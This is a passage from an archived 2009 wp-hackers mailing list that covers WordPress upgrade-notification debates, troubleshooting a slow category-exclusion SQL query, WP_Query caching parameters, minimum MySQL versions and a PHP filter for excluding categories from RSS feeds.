when it's going to cost them to fix those problems (because they can't
do it themselves). And yet the auto-mechanic analogy is continually
lost on people...


Back to the topic:

> The fact of the matter is that having more non-techy people on WP helps
> WP keep growing and diversifying. How about we give the non-techy person
> a hand and help them deal with security in a smart/informed way?

If somebody is incapable of the absolutely minimal task of keeping
their software up-to-date with the current set of tools provided to
them, then it is my considered opinion that they should not be running
WordPress or any other self-hosted website system, of any kind.

Emailing them won't change this. More tools of any kind to make it
easier won't change this. The simple fact is that upgrading is
literally one-button click on many hosting systems right now (if you
ignore things like backups and such... I usually don't bother with
backing up before upgrades anymore), and they can't even be bothered
to do that.

Call me pessimistic, but you could have it sending flowers with a note
that says "please upgrade your freakin' website" to their house, and
they'd still not click that damn button.

Fact of the matter is that you can't help everybody. Adding yet
another notification system is useless feature bloat. The people here
discussing it won't use it, and those who don't upgrade will either
turn it off, ignore the emails, mark it as spam, or stop using
WordPress.

-Otto
Sent from Memphis, TN, United States

From otto at ottodestruct.com  Fri Oct 16 19:24:18 2009
From: otto at ottodestruct.com (Otto)
Date: Fri, 16 Oct 2009 14:24:18 -0500
Subject: [wp-hackers] SELECT SQL_CALC_FOUND_ROWS distinct wp_posts query
In-Reply-To: <f38206c90910161156x50b06117k9c9ebefef588ad15@mail.gmail.com>
References: <f38206c90910160944o58abb298qaff786cdf55c0741@mail.gmail.com> 
	<161617690910161035y19523e8ap6d0a27a97c1e9084@mail.gmail.com> 
	<f38206c90910161156x50b06117k9c9ebefef588ad15@mail.gmail.com>
Message-ID: <161617690910161224q6f5b43bel5390a8a6dc0002d7@mail.gmail.com>

Sounds like that plugin needs an update.

The category__not_in parameter works just fine for query_posts, WP_Query, etc.


-Otto
Sent from Memphis, TN, United States


On Fri, Oct 16, 2009 at 1:56 PM, Jeremi Bergman <jeremib at gmail.com> wrote:
> Actually, I believe you are right. ?I narrowed it down to the *Advanced
> Category Excluder* ?plugin. ?I've disabled it, and am watching the slow
> query logs.
>
> Thanks
>
> On Fri, Oct 16, 2009 at 1:35 PM, Otto <otto at ottodestruct.com> wrote:
>
>> That doesn't appear to be a core query. At least, not in the latest
>> trunk (no idea on 2.8.4). The word "EXISTS" is not used in that sort
>> of context anywhere in the code that I can see.
>>
>> Got any weird plugins?
>>
>> -Otto
>> Sent from Memphis, TN, United States
>>
>>
>> On Fri, Oct 16, 2009 at 11:44 AM, Jeremi Bergman <jeremib at gmail.com>
>> wrote:
>> > It seems there's this one query,
>> > SELECT SQL_CALC_FOUND_ROWS distinct wp_posts.* FROM wp_posts LEFT JOIN
>> > wp_term_relationships ON (wp_posts.ID = wp_term_relationships.object_id)
>> > LEFT JOIN wp_term_taxonomy ON wp_term_taxonomy.term_taxonomy_id =
>> > wp_term_relationships.term_taxonomy_id WHERE 1=1 AND wp_posts.post_type =
>> > 'post' AND (wp_posts.post_status = 'publish') AND NOT EXISTS (SELECT *
>> FROM
>> > wp_term_relationships JOIN wp_term_taxonomy ON
>> > wp_term_taxonomy.term_taxonomy_id =
>> wp_term_relationships.term_taxonomy_id
>> > WHERE wp_term_relationships.object_id = wp_posts.ID AND
>> > wp_term_taxonomy.taxonomy = 'category' AND wp_term_taxonomy.term_id IN
>> (89)
>> > ) ORDER BY wp_posts.post_date DESC LIMIT 0, 50;
>> >
>> > That is locking up my database and bringing down my site, at least once a
>> > day. When I look in the slow queries log, it's full of them.
>> >
>> > # Time: 091016 8:56:50
>> > # User at Host: mrsec_wp[mrsec_wp] @ localhost []
>> > # Query_time: 13 Lock_time: 0 Rows_sent: 50 Rows_examined: 185675
>> > use mrsec_wp;
>> > SELECT SQL_CALC_FOUND_ROWS distinct wp_posts.* FROM wp_posts LEFT JOIN
>> > wp_term_relationships ON (wp_posts.ID = wp_term_relationships.object_id)
>> > LEFT JOIN wp_term_taxonomy ON wp_term_taxonomy.term_taxonomy_id =
>> > wp_term_relationships.term_taxonomy_id WHERE 1=1 AND wp_posts.post_type =
>> > 'post' AND (wp_posts.post_status = 'publish' OR wp_posts.post_status =
>> > 'private') AND NOT EXISTS (SELECT * FROM wp_term_relationships JOIN
>> > wp_term_taxonomy ON wp_term_taxonomy.term_taxonomy_id =
>> > wp_term_relationships.term_taxonomy_id WHERE
>> wp_term_relationships.object_id
>> > = wp_posts.ID AND wp_term_taxonomy.taxonomy = 'category' AND
>> > wp_term_taxonomy.term_id IN (89) ) ORDER BY wp_posts.post_date DESC LIMIT
>> 0,
>> > 50;
>> >
>> > Any thoughts on how I can optimize this query? ?It takes approx 13
>> seconds
>> > to execute this query. I have 28k records.
>> >
>> > Thanks
>> > --
>> > Jeremi Bergman
>> > 865-622-7134
>> > _______________________________________________
>> > wp-hackers mailing list
>> > wp-hackers at lists.automattic.com
>> > http://lists.automattic.com/mailman/listinfo/wp-hackers
>> >
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>
>
>
> --
> Jeremi Bergman
> 865-622-7134
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From ncrice at gmail.com  Fri Oct 16 19:36:28 2009
From: ncrice at gmail.com (Nathan Rice)
Date: Fri, 16 Oct 2009 15:36:28 -0400
Subject: [wp-hackers] wordpress security
In-Reply-To: <161617690910161218qc0ce84ale69067b492bf6caa@mail.gmail.com>
References: <16402dc2.1ca4e74.2324c893.2e40@BrewerRadio.com>
	<862d087f0910160827x662e8a66sb9fee81a08c0646c@mail.gmail.com>
	<e1202cb10910160937g27dad3basa6e2a7cd648eb724@mail.gmail.com>
	<op.u1wkarrbr6yny2@toscho.de>
	<161617690910161029y1de31834j2af910b3b5991284@mail.gmail.com>
	<862d087f0910161037l21575947t4ce51340033e9a97@mail.gmail.com>
	<4AD8BC80.6000406@gaarai.com>
	<161617690910161218qc0ce84ale69067b492bf6caa@mail.gmail.com>
Message-ID: <862d087f0910161236w31e65c12rf512d4722cf0234@mail.gmail.com>

On Fri, Oct 16, 2009 at 3:18 PM, Otto <otto at ottodestruct.com> wrote:

> If you're a non-techy person, then you shouldn't be hosting your own
> website in the first place. You should be using a service to do it for
> you, like WordPress.com or Blogger or *something*.
>
>
>
I think that's a bit off the mark. Everybody was a noob once. Even you.
Perhaps you had the good sense to use a hosted service, but the people I
work with don't. And I don't blame them. The hoops you have to jump through
in order to change minor things with your theme on WP.com is ridiculous.
Blogger is a joke. They want to buy or download themes from reputable people
and install it on their own site, and they probably want to use plugins too.

Bloggers aren't the only people who use WordPress. It's a different world
than it was 3 years ago. We can't keep pretending that beginners aren't
using WP. And we can't keep giving them the middle finger for doing so.
WordPress is popular BECAUSE of its low barrier of entry.


If somebody is incapable of the absolutely minimal task of keeping
> their software up-to-date with the current set of tools provided to
> them, then it is my considered opinion that they should not be running
> WordPress or any other self-hosted website system, of any kind.
>

To someone, the process isn't minimal. You're not thinking like a normal
person, and neither am I.


>
> Emailing them won't change this. More tools of any kind to make it
> easier won't change this. The simple fact is that upgrading is
> literally one-button click on many hosting systems right now (if you
> ignore things like backups and such... I usually don't bother with
> backing up before upgrades anymore), and they can't even be bothered
> to do that.
>

Why have the notification at the top of the dashboard at all, then? Why
create the 1-click upgrade? If people can't upgrade with FTP, screw 'em,
right? They're not savvy enough to be using WordPress, right?

5t00p1d n00b5.


> Call me pessimistic, but you could have it sending flowers with a note
> that says "please upgrade your freakin' website" to their house, and
> they'd still not click that damn button.
>

We're talking about *a single checkbox,* a simple feature** that sends a
single email when a new version is available. A considerable improvement
from the current notification system, and far short of the effort it would
take to send flowers to every WP users' door.

It's not bloat, it's just the next logical step. WordPress has been trying
to make upgrades easier and more seamless in the last couple of releases.
This is the cherry on top. Why skip it?


> Fact of the matter is that you can't help everybody. Adding yet
> another notification system is useless feature bloat. The people here
> discussing it won't use it, and those who don't upgrade will either
> turn it off, ignore the emails, mark it as spam, or stop using
> WordPress.
>

Do you really think that adding an email notification option will be
completely useless to the millions of WordPress users out there?

Good grief, if they don't like it, they can turn it off. I probably will.
But then, they have no reason to blame WordPress. They CHOSE to not receive
the notifications. WP will have removed every single obstacle from their
upgrade path. If they still get hacked, it's definitivley their own fault.

In the current setup, there are plenty of scenarios where the user could
legitimately claim no fault. Want me to provide examples?

Nathan Rice

From jer at simianuprising.com  Fri Oct 16 21:17:56 2009
From: jer at simianuprising.com (Jeremy Clarke)
Date: Fri, 16 Oct 2009 17:17:56 -0400
Subject: [wp-hackers] Help Needed for latest post from a selected
	category
In-Reply-To: <9140446a0910141310h428ff389r90e92bec8d156169@mail.gmail.com>
References: <a866d5db.1ca4d03.19b64bee.4e45@BrewerRadio.com>
	<8b870c460910141247y294d50e8hc0c6f43f069d464d@mail.gmail.com>
	<9140446a0910141310h428ff389r90e92bec8d156169@mail.gmail.com>
Message-ID: <e1202cb10910161417y4e9c7924n15a5f9e6c9564cf@mail.gmail.com>

On Wed, Oct 14, 2009 at 4:10 PM, Tareq Hasan <tareq1988 at gmail.com> wrote:
> Thanks Buddies for the help

Maybe you already got your stuff figured out but it sounds like you
might not have a good grasp on the 'wordpress loop', a special while()
structure you have to use on queries to have access to functions like
the_permalink().

http://codex.wordpress.org/The_Loop

That article explains the loop and gives examples of multiple loops
(including getting specific categories).

-- 
Jeremy Clarke | http://jeremyclarke.org
Code and Design | http://globalvoicesonline.org

From william.canino at googlemail.com  Fri Oct 16 21:20:16 2009
From: william.canino at googlemail.com (William Canino)
Date: Fri, 16 Oct 2009 17:20:16 -0400
Subject: [wp-hackers] SELECT SQL_CALC_FOUND_ROWS distinct wp_posts query
In-Reply-To: <161617690910161224q6f5b43bel5390a8a6dc0002d7@mail.gmail.com>
References: <f38206c90910160944o58abb298qaff786cdf55c0741@mail.gmail.com>
	<161617690910161035y19523e8ap6d0a27a97c1e9084@mail.gmail.com>
	<f38206c90910161156x50b06117k9c9ebefef588ad15@mail.gmail.com>
	<161617690910161224q6f5b43bel5390a8a6dc0002d7@mail.gmail.com>
Message-ID: <e4dc67e0910161420q34189615mde24622df602f020@mail.gmail.com>

> Sounds like that plugin needs an update.
>
> The category__not_in parameter works just fine for query_posts, WP_Query, etc.

I will agree with Otto, but Jeremi you may need to consider overall load

This is the SQL you gave:

SELECT SQL_CALC_FOUND_ROWS distinct wp_posts.* FROM wp_posts LEFT JOIN
wp_term_relationships ON (wp_posts.ID = wp_term_relationships.object_id)
LEFT JOIN wp_term_taxonomy ON wp_term_taxonomy.term_taxonomy_id =
wp_term_relationships.term_taxonomy_id WHERE 1=1 AND wp_posts.post_type =
'post' AND (wp_posts.post_status = 'publish') AND NOT EXISTS (SELECT * FROM
wp_term_relationships JOIN wp_term_taxonomy ON
wp_term_taxonomy.term_taxonomy_id = wp_term_relationships.term_taxonomy_id
WHERE wp_term_relationships.object_id = wp_posts.ID AND
wp_term_taxonomy.taxonomy = 'category' AND wp_term_taxonomy.term_id IN (89)
) ORDER BY wp_posts.post_date DESC LIMIT 0, 50;

but the following are the SQL generated by
query_posts(array('category__not_in' => array(86), 'posts_per_page' =>
50));

SELECT SQL_CALC_FOUND_ROWS  wp_posts.* FROM wp_posts  WHERE 1=1  AND
wp_posts.ID NOT IN ( SELECT tr.object_id FROM wp_term_relationships AS
tr INNER JOIN wp_term_taxonomy AS tt ON tr.term_taxonomy_id =
tt.term_taxonomy_id WHERE tt.taxonomy = 'category' AND tt.term_id IN
('86') ) AND wp_posts.post_type = 'post' AND (wp_posts.post_status =
'publish' OR wp_posts.post_status = 'private')  ORDER BY
wp_posts.post_date DESC LIMIT 0, 50

SELECT FOUND_ROWS()

SELECT t.*, tt.*, tr.object_id FROM wp_terms AS t INNER JOIN
wp_term_taxonomy AS tt ON tt.term_id = t.term_id INNER JOIN
wp_term_relationships AS tr ON tr.term_taxonomy_id =
tt.term_taxonomy_id WHERE tt.taxonomy IN ('category', 'post_tag') AND
tr.object_id IN (<fifty post ids>) ORDER BY t.name ASC

SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN
(<fifty post ids>)

whereas I suspect you only need the first one.

Good luck!

W


2009/10/16 Otto <otto at ottodestruct.com>:
> Sounds like that plugin needs an update.
>
> The category__not_in parameter works just fine for query_posts, WP_Query, etc.
>
>
> -Otto
> Sent from Memphis, TN, United States
>
>
> On Fri, Oct 16, 2009 at 1:56 PM, Jeremi Bergman <jeremib at gmail.com> wrote:
>> Actually, I believe you are right. ?I narrowed it down to the *Advanced
>> Category Excluder* ?plugin. ?I've disabled it, and am watching the slow
>> query logs.
>>
>> Thanks
>>
>> On Fri, Oct 16, 2009 at 1:35 PM, Otto <otto at ottodestruct.com> wrote:
>>
>>> That doesn't appear to be a core query. At least, not in the latest
>>> trunk (no idea on 2.8.4). The word "EXISTS" is not used in that sort
>>> of context anywhere in the code that I can see.
>>>
>>> Got any weird plugins?
>>>
>>> -Otto
>>> Sent from Memphis, TN, United States
>>>
>>>
>>> On Fri, Oct 16, 2009 at 11:44 AM, Jeremi Bergman <jeremib at gmail.com>
>>> wrote:
>>> > It seems there's this one query,
>>> > SELECT SQL_CALC_FOUND_ROWS distinct wp_posts.* FROM wp_posts LEFT JOIN
>>> > wp_term_relationships ON (wp_posts.ID = wp_term_relationships.object_id)
>>> > LEFT JOIN wp_term_taxonomy ON wp_term_taxonomy.term_taxonomy_id =
>>> > wp_term_relationships.term_taxonomy_id WHERE 1=1 AND wp_posts.post_type =
>>> > 'post' AND (wp_posts.post_status = 'publish') AND NOT EXISTS (SELECT *
>>> FROM
>>> > wp_term_relationships JOIN wp_term_taxonomy ON
>>> > wp_term_taxonomy.term_taxonomy_id =
>>> wp_term_relationships.term_taxonomy_id
>>> > WHERE wp_term_relationships.object_id = wp_posts.ID AND
>>> > wp_term_taxonomy.taxonomy = 'category' AND wp_term_taxonomy.term_id IN
>>> (89)
>>> > ) ORDER BY wp_posts.post_date DESC LIMIT 0, 50;
>>> >
>>> > That is locking up my database and bringing down my site, at least once a
>>> > day. When I look in the slow queries log, it's full of them.
>>> >
>>> > # Time: 091016 8:56:50
>>> > # User at Host: mrsec_wp[mrsec_wp] @ localhost []
>>> > # Query_time: 13 Lock_time: 0 Rows_sent: 50 Rows_examined: 185675
>>> > use mrsec_wp;
>>> > SELECT SQL_CALC_FOUND_ROWS distinct wp_posts.* FROM wp_posts LEFT JOIN
>>> > wp_term_relationships ON (wp_posts.ID = wp_term_relationships.object_id)
>>> > LEFT JOIN wp_term_taxonomy ON wp_term_taxonomy.term_taxonomy_id =
>>> > wp_term_relationships.term_taxonomy_id WHERE 1=1 AND wp_posts.post_type =
>>> > 'post' AND (wp_posts.post_status = 'publish' OR wp_posts.post_status =
>>> > 'private') AND NOT EXISTS (SELECT * FROM wp_term_relationships JOIN
>>> > wp_term_taxonomy ON wp_term_taxonomy.term_taxonomy_id =
>>> > wp_term_relationships.term_taxonomy_id WHERE
>>> wp_term_relationships.object_id
>>> > = wp_posts.ID AND wp_term_taxonomy.taxonomy = 'category' AND
>>> > wp_term_taxonomy.term_id IN (89) ) ORDER BY wp_posts.post_date DESC LIMIT
>>> 0,
>>> > 50;
>>> >
>>> > Any thoughts on how I can optimize this query? ?It takes approx 13
>>> seconds
>>> > to execute this query. I have 28k records.
>>> >
>>> > Thanks
>>> > --
>>> > Jeremi Bergman
>>> > 865-622-7134
>>> > _______________________________________________
>>> > wp-hackers mailing list
>>> > wp-hackers at lists.automattic.com
>>> > http://lists.automattic.com/mailman/listinfo/wp-hackers
>>> >
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>
>>
>>
>>
>> --
>> Jeremi Bergman
>> 865-622-7134
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From william.canino at googlemail.com  Fri Oct 16 21:38:45 2009
From: william.canino at googlemail.com (William Canino)
Date: Fri, 16 Oct 2009 17:38:45 -0400
Subject: [wp-hackers] get_post() not fetching from post cache after
	update_post_caches()
In-Reply-To: <161617690910050714u77cf3300x8471239465406500@mail.gmail.com>
References: <e4dc67e0909302239q4c093e88g4da9a77728b8b1af@mail.gmail.com>
	<349fe48b0910010909v3966d022s48ca50d0e882210c@mail.gmail.com>
	<e4dc67e0910010947g3927f06dl92f16f522f784050@mail.gmail.com>
	<161617690910020649l2ced8f39q291b11be08f94787@mail.gmail.com>
	<e4dc67e0910021118p1e12a929ke15432fc2512b06@mail.gmail.com>
	<161617690910021346j5ecc0409i5cfd1bd7ac384ca9@mail.gmail.com>
	<e4dc67e0910041104m5fb9253dj9321c467107c7aad@mail.gmail.com>
	<161617690910050714u77cf3300x8471239465406500@mail.gmail.com>
Message-ID: <e4dc67e0910161438j7305b62bh1b311521d61ccb97@mail.gmail.com>

Thanks Otto, I use posts_per_page now. ...

... only to realize that running a dozen get_permalinks(ID) is still
faster than running one WP_Query(array('post__in' => array([a dozen
post IDs])));.

I ended up coding for two cases. If the post IDs are over a dozen, I
run a WP_Query first.

I hope this tip helps another.


2009/10/5 Otto <otto at ottodestruct.com>:
> "numberposts" only works with the get_posts call, not with a WP_Query object.
>
> A WP_Query expects either "posts_per_page" or "showposts" (which is
> deprecated) for the number of posts.
>
> Setting posts_per_page to -1 will have the same effect as setting
> nopaging to true. Either will eliminate the LIMIT section entirely,
> making it return all posts.
>
> And yes, if you fail to specify a parameter, then it'll take it from defaults.
>
> -Otto
>
>
>
> On Sun, Oct 4, 2009 at 1:04 PM, William Canino
> <william.canino at googlemail.com> wrote:
>> Hello all,
>>
>> Regarding
>>
>>> $my_query = new WP_Query(array('post__in' => array([very long array of post IDs])));
>>> update_post_caches($my_query->posts);
>>> echo $get_permalink(1);
>>> echo $get_the_title(2);
>>>
>>> Do you know why WordPress is still making SQL
>>> queries on lines 3 and 4? Shouldn't they be already in
>>> the object cache?
>>
>> I found the answer ... and subsequently found an irregularity in the
>> WordPress core. ?I don't know if I should call it a bug.
>>
>> get_posts is automatically adding "LIMIT 0, 6" to the SQL statement. 6
>> is the number of posts per page set in the blog's Reading settings.
>> That's why posts 1 and 2 are not in the object cache. ?Furthermore,
>> adding either of the following
>>
>> 'numberposts' => -1 ?// as per Codex
>> 'nopaging' => true // as per Codex
>>
>> to the call, such as, $my_query = new WP_Query(array('post__in' =>
>> [very long array of post IDs], 'nopaging' => true)); makes no
>> difference.
>>
>> I opened WordPress's query.php and examined it, and found what I had to use:
>>
>> new WP_Query(array('post__in' => [very long array of post IDs],
>> 'posts_per_page' => 100000));
>>
>> or some high number. ?This is the solution.
>>
>> Moral of the Story: If one uses WP_Query for one's ends, he must set
>> all the parameters he needs so that the custom WP_Query doesn't use
>> the blog's settings.
>>
>> Is this an irregularity or is this a bug?
>>
>> W
>>
>> 2009/10/2 Otto <otto at ottodestruct.com>:
>>> That's fine, but it still doesn't show the actual contents of the
>>> cache. You're going to have to dump the cache before and after the
>>> get_the_title call to see why it's missing.
>>>
>>> -Otto
>>> Sent from Memphis, TN, United States
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From john.ivar.myrstad at gmail.com  Fri Oct 16 21:40:45 2009
From: john.ivar.myrstad at gmail.com (John Myrstad)
Date: Fri, 16 Oct 2009 23:40:45 +0200
Subject: [wp-hackers] wordpress security
In-Reply-To: <862d087f0910161236w31e65c12rf512d4722cf0234@mail.gmail.com>
References: <16402dc2.1ca4e74.2324c893.2e40@BrewerRadio.com>
	<862d087f0910160827x662e8a66sb9fee81a08c0646c@mail.gmail.com>
	<e1202cb10910160937g27dad3basa6e2a7cd648eb724@mail.gmail.com>
	<op.u1wkarrbr6yny2@toscho.de>
	<161617690910161029y1de31834j2af910b3b5991284@mail.gmail.com>
	<862d087f0910161037l21575947t4ce51340033e9a97@mail.gmail.com>
	<4AD8BC80.6000406@gaarai.com>
	<161617690910161218qc0ce84ale69067b492bf6caa@mail.gmail.com>
	<862d087f0910161236w31e65c12rf512d4722cf0234@mail.gmail.com>
Message-ID: <d29aad6e0910161440y3bfdad79w2fb79695a6e32998@mail.gmail.com>

How about a installing routine that ask the user if some "canonical" plugins
should be installed as the last step in the install/update procedure ?

Just a short list of "reccomended" canonical plugins.

John Myrstad

From scribu at gmail.com  Fri Oct 16 22:13:15 2009
From: scribu at gmail.com (scribu)
Date: Sat, 17 Oct 2009 01:13:15 +0300
Subject: [wp-hackers] wordpress security
In-Reply-To: <d29aad6e0910161440y3bfdad79w2fb79695a6e32998@mail.gmail.com>
References: <16402dc2.1ca4e74.2324c893.2e40@BrewerRadio.com>
	<862d087f0910160827x662e8a66sb9fee81a08c0646c@mail.gmail.com>
	<e1202cb10910160937g27dad3basa6e2a7cd648eb724@mail.gmail.com>
	<op.u1wkarrbr6yny2@toscho.de>
	<161617690910161029y1de31834j2af910b3b5991284@mail.gmail.com>
	<862d087f0910161037l21575947t4ce51340033e9a97@mail.gmail.com>
	<4AD8BC80.6000406@gaarai.com>
	<161617690910161218qc0ce84ale69067b492bf6caa@mail.gmail.com>
	<862d087f0910161236w31e65c12rf512d4722cf0234@mail.gmail.com>
	<d29aad6e0910161440y3bfdad79w2fb79695a6e32998@mail.gmail.com>
Message-ID: <349fe48b0910161513la7de6fdhfe2efe562b37fab6@mail.gmail.com>

On Sat, Oct 17, 2009 at 12:40 AM, John Myrstad
<john.ivar.myrstad at gmail.com>wrote:

> How about a installing routine that ask the user if some "canonical"
> plugins
> should be installed as the last step in the install/update procedure ?
>

How about starting a new topic?


-- 
http://scribu.net

From sudar at sudarmuthu.com  Sat Oct 17 03:02:46 2009
From: sudar at sudarmuthu.com (Sudar Muthu)
Date: Sat, 17 Oct 2009 08:32:46 +0530
Subject: [wp-hackers] Minimum supported version of MySQL
Message-ID: <485dd1460910162002r6f6de021tfe75795a20c4f4a4@mail.gmail.com>

Hello all,
What is the minimum version of MySQL that is supported by WordPress?

I created a Plugin and then realized that it is not compatible with MySQL 4,
I am in the process of making it compatible and need to know what is
the minimum version that I have to support.

Thanks!

With Regards,
Sudar

http://SudarMuthu.com
http://twitter.com/sudarmuthu

From wordpress at dd32.id.au  Sat Oct 17 03:13:57 2009
From: wordpress at dd32.id.au (Dion Hulse (dd32))
Date: Sat, 17 Oct 2009 14:13:57 +1100
Subject: [wp-hackers] Minimum supported version of MySQL
In-Reply-To: <485dd1460910162002r6f6de021tfe75795a20c4f4a4@mail.gmail.com>
References: <485dd1460910162002r6f6de021tfe75795a20c4f4a4@mail.gmail.com>
Message-ID: <op.u1xclj1vspxmuu@dd32.no-ip.com>

MySQL:
4.0 for WordPress 2.8
4.1.2 for WordPress 2.9

PHP 4.3 for WordPress 2.8/2.9

On Sat, 17 Oct 2009 14:02:46 +1100, Sudar Muthu <sudar at sudarmuthu.com>  
wrote:

> Hello all,
> What is the minimum version of MySQL that is supported by WordPress?
>
> I created a Plugin and then realized that it is not compatible with  
> MySQL 4,
> I am in the process of making it compatible and need to know what is
> the minimum version that I have to support.
>
> Thanks!
>
> With Regards,
> Sudar
>
> http://SudarMuthu.com
> http://twitter.com/sudarmuthu
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>


-- 
Dion Hulse
e: contact at dd32.id.au
w: http://dd32.id.au
WordPressQI: http://wordpressqi.com/

From aaron at xavisys.com  Sat Oct 17 05:52:06 2009
From: aaron at xavisys.com (Aaron D. Campbell)
Date: Fri, 16 Oct 2009 22:52:06 -0700
Subject: [wp-hackers] SELECT SQL_CALC_FOUND_ROWS distinct wp_posts query
In-Reply-To: <f38206c90910161156x50b06117k9c9ebefef588ad15@mail.gmail.com>
References: <f38206c90910160944o58abb298qaff786cdf55c0741@mail.gmail.com>
	<161617690910161035y19523e8ap6d0a27a97c1e9084@mail.gmail.com>
	<f38206c90910161156x50b06117k9c9ebefef588ad15@mail.gmail.com>
Message-ID: <4AD95B86.60705@xavisys.com>

Just as a heads up to anyone else.  That plugin can be really "handy" 
but it creates extremely heavy-handed queries, especially when combined 
with anything else.  Again, it's nice, but it doesn't scale well.  I'm 
hoping to get some time to see if I can clean it up and either pass the 
fixes back to the author or fork the plugin.

Jeremi Bergman wrote:
> Actually, I believe you are right.  I narrowed it down to the *Advanced
> Category Excluder*  plugin.  I've disabled it, and am watching the slow
> query logs.
>
> Thanks
>   


From jeremib at gmail.com  Sat Oct 17 14:10:46 2009
From: jeremib at gmail.com (Jeremi Bergman)
Date: Sat, 17 Oct 2009 10:10:46 -0400
Subject: [wp-hackers] SELECT SQL_CALC_FOUND_ROWS distinct wp_posts query
In-Reply-To: <4AD95B86.60705@xavisys.com>
References: <f38206c90910160944o58abb298qaff786cdf55c0741@mail.gmail.com> 
	<161617690910161035y19523e8ap6d0a27a97c1e9084@mail.gmail.com> 
	<f38206c90910161156x50b06117k9c9ebefef588ad15@mail.gmail.com> 
	<4AD95B86.60705@xavisys.com>
Message-ID: <f38206c90910170710p5ccedd9dy8912df3ca8f5ece4@mail.gmail.com>

Yes, it excludes certain categories from the RSS feed, among other things,
which is what we're looking for?

Is there an alternative to excluding categories from the rss feeds?

On Sat, Oct 17, 2009 at 1:52 AM, Aaron D. Campbell <aaron at xavisys.com>wrote:

> Just as a heads up to anyone else.  That plugin can be really "handy" but
> it creates extremely heavy-handed queries, especially when combined with
> anything else.  Again, it's nice, but it doesn't scale well.  I'm hoping to
> get some time to see if I can clean it up and either pass the fixes back to
> the author or fork the plugin.
>
> Jeremi Bergman wrote:
>
>> Actually, I believe you are right.  I narrowed it down to the *Advanced
>> Category Excluder*  plugin.  I've disabled it, and am watching the slow
>> query logs.
>>
>> Thanks
>>
>>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Jeremi Bergman
865-622-7134

From paul at codehooligans.com  Sat Oct 17 14:57:00 2009
From: paul at codehooligans.com (Paul)
Date: Sat, 17 Oct 2009 09:57:00 -0500
Subject: [wp-hackers] SELECT SQL_CALC_FOUND_ROWS distinct wp_posts query
In-Reply-To: <f38206c90910170710p5ccedd9dy8912df3ca8f5ece4@mail.gmail.com>
References: <f38206c90910160944o58abb298qaff786cdf55c0741@mail.gmail.com>
	<161617690910161035y19523e8ap6d0a27a97c1e9084@mail.gmail.com>
	<f38206c90910161156x50b06117k9c9ebefef588ad15@mail.gmail.com>
	<4AD95B86.60705@xavisys.com>
	<f38206c90910170710p5ccedd9dy8912df3ca8f5ece4@mail.gmail.com>
Message-ID: <CCB646A6-3D05-4330-BE2F-56C27EC8A060@codehooligans.com>

Not to comment on the plugin author's work. But to exclude categories  
from the RSS feed is quite simple and can be accomplished using build- 
in WP hooks and not any query manipulation needed. Consider the simple  
function below.

In this I want to exclude categories 1, 32, 16 and 28 from the main  
RSS feed. Drop this into your theme's functions.php and tweak the  
category IDs.

function myRSSPostsFilter($query) {
	if ($query->is_feed) {
		$query->set('cat','-1,-32,-16,-28');
	}
	return $query;
}
add_filter('pre_get_posts','myRSSPostsFilter');


Or you can use my Simply Exclude plugin http://wordpress.org/extend/plugins/simply-exclude/ 
  to have a nice user interface so you don't have to touch the code.  
The code uses the same basic principal as the function above. I wrote  
a similar plugin that allow exclude of categories, tags and authors  
from is_front, is_archive, is_search and is_feed actions.

Best,

Paul


On Oct 17, 2009, at 9:10 AM, Jeremi Bergman wrote:

> Yes, it excludes certain categories from the RSS feed, among other  
> things,
> which is what we're looking for?
>
> Is there an alternative to excluding categories from the rss feeds?
>
> -- 
> Jeremi Bergman
> 865-622-7134
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From jeremib at gmail.com  Sat Oct 17 17:39:51 2009
From: jeremib at gmail.com (Jeremi Bergman)
Date: Sat, 17 Oct 2009 13:39:51 -0400
Subject: [wp-hackers] SELECT SQL_CALC_FOUND_ROWS distinct wp_posts query
In-Reply-To: <CCB646A6-3D05-4330-BE2F-56C27EC8A060@codehooligans.com>
References: <f38206c90910160944o58abb298qaff786cdf55c0741@mail.gmail.com> 
	<161617690910161035y19523e8ap6d0a27a97c1e9084@mail.gmail.com> 
	<f38206c90910161156x50b06117k9c9ebefef588ad15@mail.gmail.com> 
	<4AD95B86.60705@xavisys.com>
	<f38206c90910170710p5ccedd9dy8912df3ca8f5ece4@mail.gmail.com> 
	<CCB646A6-3D05-4330-BE2F-56C27EC8A060@codehooligans.com>
Message-ID: <f38206c90910171039l63bc0b8egbb493546611bd203@mail.gmail.com>

Thanks Paul. That function will work perfectly without the overhead of a
plugin.

On Sat, Oct 17, 2009 at 10:57 AM, Paul <paul at codehooligans.com> wrote:

> Not to comment on the plugin author's work. But to exclude categories from
> the RSS feed is quite simple and can be accomplished using build-in WP hooks
> and not any query manipulation needed. Consider the simple function below.
>
> In this I want to exclude categories 1, 32, 16 and 28 from the main RSS
> feed. Drop this into your theme's functions.php and tweak the category IDs.
>
> function myRSSPostsFilter($query) {
>        if ($query->is_feed) {
>                $query->set('cat','-1,-32,-16,-28');
>        }
>        return $query;
> }
> add_filter('pre_get_posts','myRSSPostsFilter');
>
>
